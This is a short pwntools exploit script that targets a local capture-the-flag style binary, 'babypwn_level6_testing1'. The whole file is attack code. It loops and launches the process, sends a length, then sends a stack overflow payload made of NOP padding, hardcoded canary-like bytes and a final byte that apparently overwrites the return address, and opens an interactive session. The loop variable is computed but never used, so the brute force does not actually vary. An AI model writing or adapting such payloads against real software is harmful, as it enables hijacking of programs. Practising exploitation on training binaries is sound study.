from pwn import *
for i in range(100, 256):
    r = process("/babypwn_level6_testing1")
    r.sendline(str(200))
    print(i)
    stri='\x00'
    index = ord(stri)
    stri = chr(index+i)
    r.send('\x90'*40 + '\x00' + '\xcb' + '\x67' + '\xb1' + '\xe2' + '\xbc' + '\xe3' + '\x70' + '\x90'*8 + '\x17')
    r.interactive()
